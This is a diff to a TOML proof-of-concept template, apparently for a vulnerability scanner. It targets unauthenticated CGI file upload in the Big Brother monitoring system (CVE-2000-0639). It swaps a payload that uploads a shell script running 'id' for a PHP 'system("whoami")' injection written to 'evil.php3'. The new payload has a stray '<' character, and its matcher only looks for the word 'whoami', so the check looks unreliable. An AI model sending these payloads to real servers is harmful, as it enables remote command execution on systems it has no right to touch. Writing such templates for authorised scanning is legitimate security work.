@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "通过向 Big Brother bbd CGI 接口发送特制请求，上传具有 .cgi 扩展名的文件到 Web 服务器可执行目录，导致任意命令执行。验证方式：发送包含恶意文件名的上传请求，检查响应中是否包含成功标识。"
+description = "该漏洞利用Big Brother 监控系统1.4h2及更早版本的默认配置缺陷，通过bbd组件上传具有可执行扩展名的CGI文件，进而实现远程命令执行。攻击者无需认证即可将恶意脚本上传到服务器并通过web服务器执行。"
 id = "POC-AVE-2000-0491"
-name = "Big Brother bbd CGI File Creation PoC"
+name = "CVE-2000-0639 Big Brother CGI File Upload Remote Command Execution PoC"
 severity = "high"
 tags = ["ave-2000-0491"]
 vuln_id = [
@@ -15,11 +15,11 @@ logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cgi-bin/bbd"
+path = "/bb"
 protocol = "http"
 
 [poc.requests.body]
-content = "cmd=upload&filename=test.cgi&data=%23!/bin/sh%0Aecho+Content-Type:+text/plain%0Aecho+%0Aid"
+content = 'status=evil.php3&cmd=<?<system(\"whoami\");?>'
 type = "raw"
 
 [poc.requests.headers]
@@ -30,8 +30,4 @@ User-Agent = "AVE/1.0"
 expect = true
 part = "body"
 type = "word"
-words = [
-    "uploaded",
-    "success",
-    "OK",
-]
+words = ["whoami"]
